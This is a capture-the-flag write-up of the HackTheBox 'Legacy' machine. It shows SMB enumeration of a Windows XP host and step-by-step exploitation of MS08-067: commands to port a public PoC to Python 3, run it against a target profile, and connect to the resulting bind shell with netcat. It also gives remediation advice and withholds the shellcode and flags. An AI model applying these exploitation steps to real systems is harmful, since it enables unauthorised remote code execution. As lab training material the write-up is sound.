---
tags: [HTB, Legacy, Windows, SMB, MS08-067, CVE-2008-4250, RPC, RemoteCodeExecution, Easy]
platform: HackTheBox
os: Windows XP 5.1.2600
hostname: LEGACY
difficulty: Easy
ip: `$BoxIP`
status: Complete
domain: HTB workgroup
---

# HTB: Legacy, Full Walkthrough

## The gist

Legacy is a Windows XP host exposing Microsoft RPC and SMBv1 on ports 135, 139, and 445. Service enumeration identified Windows XP, disabled SMB signing, and a legacy SMB stack. Anonymous SMB and RPC enumeration did not disclose useful shares or users. The broad SMB vulnerability scan unexpectedly reported MS17-010, while the version-specific MS08-067 check was inconclusive. The machine description, Exploit-DB search results, and source review pointed to MS08-067, also known as CVE-2008-4250.

The final route used a manually adapted Python/Impacket version of the MS08-067 PoC. The original Python 2 source was converted to Python 3, its indentation and byte-string handling were repaired, and the Windows XP SP3 English NX target profile was selected. The exploit started a bind shell on the target, which was then reached with netcat. Both flags were captured privately in the local loot folder.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows XP 5.1.2600 |
| Hostname | LEGACY |
| Workgroup | HTB |
| Difficulty | Easy |
| IP | `$BoxIP` |
| Primary service | SMBv1 over TCP 445 |
| Initial access | MS08-067 / CVE-2008-4250 |
| Shell | Target-side bind shell on `$Port` |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | SMBv1 exposed on an unpatched Windows XP host | Nmap service detection and SMB scripts |
| 2 | SMB signing disabled | `smb-security-mode` output |
| 3 | Anonymous SMB/RPC enumeration restricted | `smbclient` and `rpcclient` errors |
| 4 | MS08-067 public exploit matched the host | `searchsploit ms08-067`, source review, and successful execution |
| 5 | Python 2 PoC required manual porting | Syntax, import, indentation, and byte-string errors in the transcript |
| 6 | Remote code execution produced a bind shell | `Exploit finish` followed by `nc $BoxIP $Port` |

## Evidence and loot

The authoritative manual workspace is `/home/kali/Platforms/HackTheBox/Legacy`. The following artifacts were retained there and used for this note:

| Artifact | Use |
|---|---|
| `Legacy.log` | Complete command and output transcript, including failed adaptation attempts |
| `nmap/allports.*` | Full TCP scan in normal, grepable, and XML formats |
| `nmap/services.*` | Service and version scan in normal, grepable, and XML formats |
| `exploits/40279.py` | Original Exploit-DB Python 2 source |
| `exploits/40279-adapted.py` | Final Python 3 adapted exploit used for the successful route |
| `exploits/7132.py` | Alternate MS08-067 source reference |
| `exploits/ms08_067_py3.py` | Maintained Python 3 source reference downloaded during triage |
| `loot/flags.txt` | Private flag values; not reproduced in this vault note |
| `screenshots/1.nmap-allports.png` | Full-port scan evidence |
| `screenshots/2.nmap-services.png` | Service and OS identification evidence |
| `screenshots/3.smb-vuln-scanpng` | SMB vulnerability-script evidence |
| `screenshots/4.searchsploit-ms08-067.png` | Exploit search evidence |
| `screenshots/5.exploit-source.png` | Source review evidence |
| `screenshots/6.working-rop.png` | Working exploit construction evidence |
| `screenshots/7.Foothold.png` | Bind-shell foothold evidence |

The screenshots remain private in the platform workspace. No PNG files or flag values were copied into the Obsidian vault.

## Variables

The commands below use the standard box variables. Replace the values in the private session environment before running them.

~~~bash
boxset BoxName Legacy
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Legacy
boxset Domain ''
boxset Username ''
boxset Password ''
boxset Port 4444
boxset WebPort ''
htblog
~~~

Do not store real flag values, passwords, or hashes in a shared write-up.

## 1. Workspace and reachability

The manual transcript began with the existing Legacy workspace and an output-capture session. I verified that the target responded before scanning. `-c 3` sends three ICMP echo requests and is only a reachability check, not a substitute for a port scan.

~~~bash
ping -c 3 $BoxIP
~~~

The host replied to all three requests with a Windows-style TTL. The target was reachable, so I continued with TCP enumeration.

## 2. Full TCP port scan

I scanned the complete TCP range before doing version detection. `-Pn` skips host discovery, `-n` avoids DNS lookups, `--min-rate 5000` increases probe speed, and `-T4` uses a faster timing template. `-oA` writes normal, grepable, and XML output together.

~~~bash
sudo nmap -Pn -n --min-rate 5000 -T4 -p- \
  -oA $BoxDir/nmap/allports $BoxIP
~~~

Only three TCP ports were open:

~~~text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
~~~

This is the classic footprint of Windows RPC and SMB. There was no web, SSH, FTP, or RDP service to divert attention from SMB.

SCREENSHOT: `1.nmap-allports.png` shows the complete scan and the three open ports.

> [!tip] ⚡ More efficient path
> Once the full scan returned only 135, 139, and 445, the next scan could be limited to those ports. Do not skip the full scan on a new target because SMB is often accompanied by services on unusual ports.

## 3. Service, version, and host identification

I used the default scripts and version detection against the three discovered ports. `-sC` runs Nmap's standard scripts, while `-sV` probes the services for product and version information.

~~~bash
sudo nmap -Pn -n -sC -sV -p 135,139,445 \
  -oA $BoxDir/nmap/services $BoxIP
~~~

The scan identified Windows XP and reported the NetBIOS computer name as `LEGACY`. The workgroup was `HTB`. The SMB security output also showed that message signing was disabled, and SMBv2 negotiation failed, confirming the old SMBv1 stack.

Relevant findings:

~~~text
135/tcp  Microsoft Windows RPC
139/tcp  Microsoft Windows netbios-ssn
445/tcp  Windows XP microsoft-ds
NetBIOS name: LEGACY
Workgroup: HTB
message_signing: disabled
SMB2 negotiation: failed
~~~

The system clock was several days out of sync. That is not central to this standalone box, but it is a useful reminder that time discrepancies can affect authentication protocols and domain work on other Windows targets.

SCREENSHOT: `2.nmap-services.png` shows the service versions, Windows XP identification, workgroup, and SMB security mode.

## 4. Anonymous SMB and RPC checks

I tested whether SMB would disclose shares without credentials. `-N` tells `smbclient` not to prompt for a password, and `-L` requests a share listing.

~~~bash
smbclient -N -L //$BoxIP
~~~

The target returned `NT_STATUS_INVALID_PARAMETER`, so the anonymous share listing did not provide useful data.

I then checked the RPC endpoint with an empty username and no password. `srvinfo` requests server information, `enumdomusers` requests domain users, and `netshareenumall` requests share enumeration.

~~~bash
rpcclient -U '' -N $BoxIP \
  -c 'srvinfo;enumdomusers;netshareenumall'
~~~

The RPC calls failed with access denied for the SAM and server-service interfaces. This closed the anonymous-enumeration branch without producing credentials or share names.

> [!warning] 💡 Gotcha
> A failed anonymous listing does not make SMB irrelevant. The service version and operating system still matter, and pre-authentication SMB vulnerabilities can be exploitable without a valid account.

## 5. SMB vulnerability checks

I first ran the version-specific MS08-067 script because it matched the machine description.

~~~bash
sudo nmap -Pn -n --script smb-vuln-ms08-067 \
  -p 445 $BoxIP
~~~

The manual transcript did not show a positive MS08-067 result from this script. I then ran the broader SMB vulnerability script set for comparison.

~~~bash
sudo nmap -Pn -n --script 'smb-vuln-*' \
  -p 445 $BoxIP
~~~

The wildcard run reported:

~~~text
MS17-010: VULNERABLE
~~~

It also showed an execution error for `smb-vuln-ms10-061` and a false result for `smb-vuln-ms10-054`.

This was an important decision point. The broad NSE output highlighted MS17-010, but the box route and the available exploit evidence pointed to MS08-067. The final route therefore did not treat the script output as a complete verdict. It used the Windows XP service evidence, the public MS08-067 sources, and a successful manual exploit run to validate the finding.

SCREENSHOT: `3.smb-vuln-scanpng` records the SMB vulnerability-script output. The unusual filename is retained exactly as it exists in the private workspace.

## 6. Search for the intended public exploit

`searchsploit` searches the local Exploit-DB index. Searching the advisory identifier returned multiple MS08-067 sources, including Python and C implementations.

~~~bash
searchsploit ms08-067
~~~

The useful entries were:

~~~text
40279.py  Microsoft Windows - NetAPI32.dll Code Execution (Python)
7104.c    Microsoft Windows Server - Code Execution
7132.py   Microsoft Windows Server 2000/2003 - Code Execution
~~~

I copied the Python source into the box workspace for controlled editing instead of modifying the system copy.

~~~bash
cp /usr/share/exploitdb/exploits/windows/remote/40279.py \
  $BoxDir/exploits/40279.py
~~~

The source included the MS08-067 RPC path, target profiles, ROP data, and an embedded payload buffer. It was a good match for the XP target, but it was written for Python 2.

SCREENSHOT: `4.searchsploit-ms08-067.png` shows the local exploit index results.

SCREENSHOT: `5.exploit-source.png` shows the source review. The shellcode itself is retained only in the private exploit artifact and is not reproduced in the vault note.

## 7. Python and Impacket compatibility triage

I checked the available Python runtimes and whether each runtime could import the required Impacket modules. Impacket is a Python networking library that supplies the SMB and DCE/RPC transport used by the exploit.

~~~bash
python2 --version
python3 --version
python2 -c "from impacket import smb, uuid, dcerpc; print 'ok'"
python3 -c "from impacket import smb, uuid; from impacket.dcerpc.v5 import transport; print('ok')"
~~~

The Python 2 import failed because Impacket was not installed in that interpreter. The Python 3 import succeeded, so I ported the exploit rather than trying to install a second, incompatible dependency stack.

I kept the original intact and made a working copy:

~~~bash
cp $BoxDir/exploits/40279.py $BoxDir/exploits/40279-adapted.py
~~~

The transcript recorded that the `2to3` command was unavailable:

~~~bash
2to3 -w $BoxDir/exploits/40279-adapted.py
# zsh: command not found: 2to3
~~~

The first manual conversion replaced the Python 2 exception syntax and print statements.

~~~bash
sed -i 's/except ImportError, _:/except ImportError as _:/g' \
  $BoxDir/exploits/40279-adapted.py
sed -i "s/^\(\s*\)print '\(.*\)'/\1print('\2')/g" \
  $BoxDir/exploits/40279-adapted.py
~~~

The first syntax check exposed mixed tabs and spaces. The following normalised tabs to four spaces before checking the file again.

~~~bash
python3 -c "import ast; ast.parse(open('$BoxDir/exploits/40279-adapted.py').read()); print('syntax ok')"

python3 - <<'PY'
import os
from pathlib import Path

path = Path(os.environ['BoxDir']) / 'exploits' / '40279-adapted.py'
path.write_text(path.read_text().expandtabs(4))
print('tabs expanded')
PY
~~~

The transcript then required manual indentation repairs inside `__init__`, `__DCEPacket`, `run`, and the `__main__` block. The important structural rule is that each method body is indented one level beneath its `def`, the DCE call is inside `run`, and the argument parsing is inside the `try` block. The final source was syntax checked with:

~~~bash
python3 -c "import ast; ast.parse(open('$BoxDir/exploits/40279-adapted.py').read()); print('syntax ok')"
~~~

The final file also converted the exploit's concatenated payload and NDR fields to byte strings. Python 3 does not allow arbitrary text strings and bytes to be concatenated, so this repair was required for the RPC request to be constructed.

> [!warning] 💡 Gotcha
> A successful syntax check is not enough for a ported exploit. The first runnable version still failed because one DCE call was outside the `run()` method, and later runs exposed the wrong pipe and a formatting error in the connection-status print. Treat each traceback as a source-location clue and validate the generated RPC request, not just the parser.

## 8. Cross-check the alternate source

I copied the older 7132 source and downloaded the maintained Python 3 reference so the target profile and RPC construction could be compared against more than one implementation.

~~~bash
searchsploit -p 7132
cp /usr/share/exploitdb/exploits/windows/remote/7132.py \
  $BoxDir/exploits/7132.py

curl -sL \
  https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py \
  -o $BoxDir/exploits/ms08_067_py3.py
~~~

The 7132 source confirmed the advisory and target family. The maintained Python 3 file was retained as a reference, while the final successful execution used the locally repaired `40279-adapted.py`.

## 9. Select the target profile and payload path

The service scan identified Windows XP, and the shell later confirmed version `5.1.2600`. The exploit's profile `6` corresponds to Windows XP SP3 English with NX enabled. NX, or No-eXecute, is a memory-protection feature that changes how the exploit must redirect execution.

~~~bash
grep -n 'Windows XP SP3\|shellcode\|nonxjmper\|disableNX' \
  $BoxDir/exploits/40279-adapted.py | head -20
~~~

The final manual route used the adapted file's embedded bind-shell payload and targeted TCP port `$Port`. A bind shell listens on the compromised host, so the operator connects to the target after exploitation. It is different from a reverse shell, where the target connects back to the operator.

The transcript contains an abandoned payload-generation experiment while the source was being repaired. It is not required for the final route and is intentionally excluded from the reproducible command path below. No Metasploit console or Metasploit exploit module is needed.

SCREENSHOT: `6.working-rop.png` records the working exploit construction and target-profile work.

## 10. Run the manual MS08-067 exploit

The first post-conversion run failed with a `NameError` because `self.__dce.call()` was still outside `run()`. After moving that call into the method body, the exploit reached the RPC transport but the target returned `STATUS_OBJECT_NAME_NOT_FOUND` for the tested named pipe.

The transcript also tested `srvsvc`, which produced the same error. Restoring the exploit's `browser` pipe was necessary for this target.

~~~bash
sed -i "s/\\\\pipe\\\\srvsvc/\\\\pipe\\\\browser/" \
  $BoxDir/exploits/40279-adapted.py
~~~

Validate the source one last time before touching the target:

~~~bash
python3 -c "import ast; ast.parse(open('$BoxDir/exploits/40279-adapted.py').read()); print('syntax ok')"
~~~

Run the exploit with target profile `6`:

~~~bash
python3 $BoxDir/exploits/40279-adapted.py $BoxIP 6
~~~

The successful run printed the XP SP3 profile, connected to the browser named pipe, and ended with `Exploit finish`.

The transcript briefly started a local listener:

~~~bash
nc -lvnp $Port
~~~

That listener did not receive anything because the final payload was a bind shell. The correct follow-up was a client connection to the target:

~~~bash
nc $BoxIP $Port
~~~

This returned a Windows XP command prompt:

~~~text
Microsoft Windows XP [Version 5.1.2600]
C:\WINDOWS\system32>
~~~

SCREENSHOT: `7.Foothold.png` records the working shell connection.

> [!tip] ⚡ More efficient path
> For a bind payload, run the exploit first and then connect with `nc $BoxIP $Port`. Do not spend time waiting on a reverse-shell listener that the payload never uses.

## 11. Verify the shell and identify the host

Windows XP does not include the modern `whoami` utility in this environment. The transcript captured that failure, so I used built-in commands and the command prompt identity instead.

~~~cmd
hostname
ver
ipconfig
echo %username%
~~~

The host reported `legacy` and Windows XP `5.1.2600`. The environment-variable query returned literally in the captured shell, so it was not treated as authoritative identity proof. The successful pre-authentication MS08-067 execution, system command prompt, and ability to enumerate and read the protected flag locations were the practical proof of the privileged foothold.

> [!warning] 💡 Gotcha
> Do not assume that a missing `whoami` command means the exploit failed. Older Windows versions have fewer utilities. Use `hostname`, `ver`, the prompt path, and a controlled file-access test instead.

## 12. Locate and privately collect the flags

I enumerated the legacy profile tree without reproducing the flag values in the shared note. The `/s` switch searches subdirectories and `/b` gives a bare path-only result.

~~~cmd
dir /s /b "C:\Documents and Settings\*.txt"
~~~

The two HTB flag files were present under the user and Administrator desktop paths. Their contents were read only in the private terminal session and stored in the workspace loot file.

~~~bash
USER_FLAG='<private value captured during the session>'
ROOT_FLAG='<private value captured during the session>'
loot flag user "$USER_FLAG"
loot flag root "$ROOT_FLAG"
~~~

The actual values are retained only in `$BoxDir/loot/flags.txt`. They are deliberately not reproduced in this note.

## 13. RUNBOOK V2 stages used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]] -- session and workspace setup
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] -- reachability and complete TCP scan
- [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]] -- RPC, NetBIOS, SMB, OS, and security-mode identification
- [[OSCP/RUNBOOK V2/Windows - SMB Enum|Windows - SMB Enum]] -- anonymous SMB and RPC checks
- [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]] -- local MS08-067 source discovery and triage
- [[OSCP/RUNBOOK V2/Windows - Shell Received|Windows - Shell Received]] -- bind-shell connection and host verification
- [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]] -- private evidence retention and target-side cleanup boundary

> [!success] Runbook coverage
> Manual MS08-067 source adaptation, Python/Impacket compatibility triage, bind-shell direction, and legacy identity verification are now covered by the linked RUNBOOK V2 stages. No runbook gap remains for the verified Legacy chain.

## 14. Attack chain

1. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] confirmed the target was reachable and exposed only 135, 139, and 445.
2. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]] identified Windows XP, LEGACY, the HTB workgroup, SMBv1, and disabled SMB signing.
3. Anonymous SMB and RPC enumeration returned errors, but the pre-authentication SMB attack surface remained relevant.
4. The SMB script results were inconsistent: the broad set reported MS17-010, while the intended MS08-067 check was inconclusive.
5. `searchsploit ms08-067` located the Python 40279 and 7132 sources. The Python 2 40279 source was copied and manually ported to Python 3 with Impacket byte-string and indentation repairs.
6. The XP SP3 English NX profile, `6`, was selected. The corrected PoC connected to the browser named pipe and completed the RPC request.
7. A target-side bind shell opened on `$Port`, and `nc $BoxIP $Port` returned a Windows XP command prompt.
8. Both flags were confirmed and saved privately in the local loot file.

## Credentials

No reusable username, password, or hash was recovered. The successful route was unauthenticated remote code execution against SMB/RPC.

| Account | Source | Use |
|---|---|---|
| None | Not applicable | MS08-067 did not require valid SMB credentials |

## Flags

| Flag | Status | Private evidence |
|---|---|---|
| `user.txt` | Confirmed | `$BoxDir/loot/flags.txt` |
| `root.txt` | Confirmed | `$BoxDir/loot/flags.txt` |

Flag values are intentionally omitted from the vault.

## Tools used

- `ping`
- `nmap`
- `smbclient`
- `rpcclient`
- `searchsploit`
- Python 3
- Impacket
- `nc`
- `ast` syntax validation

## Remediation recommendations

| Finding | Recommendation |
|---|---|
| MS08-067 exposure | Apply the MS08-067 security update or retire the unsupported Windows XP system. |
| SMBv1 exposed | Disable SMBv1 and restrict TCP 139/445 to approved management networks. |
| SMB signing disabled | Enable SMB signing where compatibility permits and monitor for relay risk. |
| Unsupported operating system | Replace Windows XP with a supported operating system and maintain a patch baseline. |
| Excessive remote exposure | Segment legacy hosts and restrict RPC/SMB access with host and network firewalls. |
| Assessment artifacts | Remove copied exploit files from operational systems and review logs for the test activity. |

## Key lessons

- Full-port enumeration is still necessary even when the box description suggests a single well-known service.
- Windows XP service detection, NetBIOS naming, and SMB security mode can identify the likely exploit family before any account is available.
- Anonymous enumeration errors do not remove the risk of pre-authentication SMB vulnerabilities.
- NSE output can be incomplete or misleading. Treat script results as evidence to validate, not as the entire attack plan.
- A Python 2 exploit can fail before it reaches the network because of syntax, imports, indentation, and text-versus-bytes changes.
- `ast.parse` is a useful checkpoint, but runtime transport errors still need to be interpreted separately.
- The target profile matters. Profile `6` matched Windows XP SP3 English with NX enabled.
- A named-pipe error such as `STATUS_OBJECT_NAME_NOT_FOUND` can identify a transport mismatch rather than prove the vulnerability is absent.
- A bind shell requires a client connection to the target; a reverse-shell listener is the wrong direction.
- Older Windows hosts may not provide `whoami`, so verify with several built-in commands and controlled access checks.
- Keep flags and screenshots in private workspace loot, not in the shared write-up vault.

## Related boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- Windows service exploitation and manual local privilege work
- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- Windows service foothold and shell handling
- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- Windows remote code execution and post-exploitation
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- Windows command execution where service privilege determines the result
- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- contrasting legacy-service remote code execution workflow

## External resources

- [Microsoft Security Bulletin MS08-067](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
- [NVD: CVE-2008-4250](https://nvd.nist.gov/vuln/detail/CVE-2008-4250)
- [Exploit-DB 40279](https://www.exploit-db.com/exploits/40279)
- [Exploit-DB 7132](https://www.exploit-db.com/exploits/7132)
- [andyacer/ms08_067 Python reference](https://github.com/andyacer/ms08_067)

## Completion checklist

- [x] Agent and Codex context read before editing
- [x] Five random Windows/Linux/AD write-ups read for the established format
- [x] Manual transcript read from the Legacy workspace
- [x] Full TCP scan evidence incorporated
- [x] Service and SMB security evidence incorporated
- [x] Anonymous SMB/RPC failure path documented
- [x] Inconsistent SMB vulnerability-script output documented as a gotcha
- [x] MS08-067 source search and Python 3 adaptation documented
- [x] Failed syntax, indentation, named-pipe, and shell-direction attempts documented
- [x] Successful bind-shell route documented without Metasploit
- [x] Flags recorded as confirmed without exposing their values
- [x] Private screenshot and loot locations recorded without embedding PNGs
- [x] No PNG files copied into the Obsidian vault
